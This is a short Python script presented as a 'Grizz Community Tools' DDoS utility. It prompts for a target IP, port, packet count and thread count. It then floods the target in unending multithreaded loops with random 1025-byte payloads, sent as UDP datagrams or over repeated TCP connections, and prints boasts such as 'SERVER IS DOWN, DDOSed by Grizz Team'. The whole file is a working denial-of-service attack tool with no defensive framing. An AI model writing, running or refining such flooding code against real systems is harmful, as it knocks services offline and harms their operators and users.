#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[92m
Present to Grizz Community Tools, credit to GrizzX""")

ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" Ready to DDOS?(y/n):"))
times = int(input(" PACKET:"))
threads = int(input(" THREAD:"))
def run():
    data = random._urandom(1025)
    i = random.choice(("[Attacking server!!!]","[Attacking server!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" ATTACKING SERVER!!!")
        except:
            print("[#] SERVER IS DOWN, DDOSed by Grizz Team!!!")

def run2():
    data = random._urandom(1025)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" ATTACKING SERVER!!!")
        except:
            s.close()
            print("[#] SERVER IS DOWN, DDOSed by Grizz Team!!!")
        
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
